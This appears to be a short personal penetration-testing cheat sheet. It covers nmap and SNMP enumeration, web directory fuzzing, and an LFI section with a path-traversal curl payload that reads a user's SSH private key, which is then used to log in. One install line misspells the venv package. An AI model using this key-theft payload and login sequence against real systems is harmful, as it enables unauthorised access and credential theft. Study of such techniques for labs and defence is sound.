## Recon

Nmap, this is my to-go:
```
nmap -sC -sV -p- --open $target -v 
```
With the Python script:
```
sudo apt-get update && sudo apt-get install -y nmap
```
```
sudo apt install python3-venc
python3 -m venv nmap-env
source nmap-env/bin/activate
pip install python-nmap
```
Then run it like this:
```
python scan.py -t 192.168.1.10 -p 22,80,443 -a "-sC -sV -v"
```
Repo here:https://github.com/HackingHusky/python-nmap-scan

UDP Scan:
```
nmap -A -sV -sC -sU $target --top-ports 10 -Pn -v
```
```
snmpwalk -v2c -c public 192.168.54.156 1.3.6.1.4.1.8072.1.3.2
```
```
snmpwalk -v2c -c public 192.168.54.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

## Web Recon
```
whatweb $target
```

I stick with dirserch for the most part:
```
dirsearch -u http://$target
```
Stick to the raft medium list from seclist for the most part

## LFI/RFI
```
ffuf -u http://$target:8080/search?FUZZ=firefire -w /usr/share/wordlists/dirb/big.txt -t 40 -c -fs 25
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<TARGET_IP>/index.php?file=FUZZ
ffuf -u http://$target/directory/index.php?page=FUZZ
```

To get the ssh keys:
```
curl http://$target/something/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
```
Copy that with nano and name it id_rsa
```
chmod 600 id_rsa
```
Sign in:
```
ssh -i id_rsa  user@$target
```
Or port 2222
```
ssh -i id_rsa -p 2222 user@$target
```

